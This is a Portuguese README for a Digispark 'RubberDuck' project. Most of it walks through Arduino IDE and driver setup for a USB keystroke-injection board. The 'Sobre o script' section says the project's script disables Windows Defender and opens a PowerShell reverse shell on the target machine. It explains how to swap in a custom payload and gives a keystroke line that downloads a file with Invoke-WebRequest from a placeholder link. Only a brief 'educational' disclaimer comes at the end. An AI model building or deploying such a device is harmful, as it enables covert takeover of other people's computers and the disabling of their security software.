# RubberDuck_Digispark

### Onde comprar: 
#### "Digispark"
    https://pt.aliexpress.com/item/2040316211.html?src=google&aff_fcid=9e866273062d4296861b47a9f964a842-1639422718025-06486-UneMJZVf&aff_fsk=UneMJZVf&aff_platform=aaf&sk=UneMJZVf&aff_trace_key=9e866273062d4296861b47a9f964a842-1639422718025-06486-UneMJZVf&terminal_id=8aa35bb270a04908bf8a5a0994450a81

### Configurar o RubberDuck:
Baixe a IDE do Arduino aqui:
    https://www.arduino.cc/en/software

Baixe e instale os drivers do Digispark aqui:
    https://github.com/digistump/DigistumpArduino/releases/download/1.6.7/Digistump.Drivers.zip

(Role a página para baixo e baixe a Arduino Legacy IDE (1.8.X), que é uma versão com menos bugs.)

Após instalar e abrir o Arduino, aperte "Ctrl + Vírgula", o que abrirá as preferências. Na parte de "URLs Adicionais para Gerenciadores de Placas", cole o seguinte link:
#### URL de configuração do Digispark:
    https://raw.githubusercontent.com/digistump/arduino-boards-index/master/package_digistump_index.json
![alt text](<img/Screenshot_1.png>)

Depois, vá para: Ferramentas > Placa > Gerenciador de Placas. A tela de "Gerenciador de Placas" será exibida. Nessa tela, pesquise por "Digispark" e instale a única opção que aparece:
![alt text](<img/Screenshot_2.png>)

Após a instalação da placa, vá ao menu e selecione-a para começar a codificar:
![alt text](<img/Screenshot_3.png>)

Depois de configurar tudo, sempre inclua esses dois *includes* no início do seu script
(sempre mantenha o arquivo *DigiKeyboardPtBr.h* dentro da pasta do seu script):
![alt text](<img/Screenshot_4.png>)

### Baixe o DigiKeyboardPtBr aqui:
    https://github.com/cosmosredshiftsete/RubberDuck_Digispark/blob/main/DigiKeyboardPtBr.h
(Caso você baixe o repositório, o arquivo já virá junto.)

### Sobre o script:
Esse script do repositório faz o RubberDuck desativar o Windows Defender da máquina e executar uma *reverse shell* via PowerShell. Recomendo seguir a mesma lógica do script do RubberDuck. Caso queira subir um script diferente na máquina, você deve criar um repositório no GitHub com seu script e colocar o link do seu repositório na linha 49, que ele irá executar baixando via PowerShell.
#### Exemplo:
          DigiKeyboardPtBr.println("Invoke-WebRequest -Uri 'link do seu repositório aqui' -OutFile 'nome_arquivo.aqui'");



# Aviso de Responsabilidade

Este projeto foi criado exclusivamente para fins educativos, com o objetivo de simular um RubberDuck. Ele não deve ser utilizado em situações que possam causar danos a terceiros, direta ou indiretamente. O autor do repositório não assume qualquer responsabilidade por problemas ou consequências decorrentes do uso inadequado ou mal-intencionado deste código. Use-o com responsabilidade e em conformidade com as leis e normas aplicáveis.
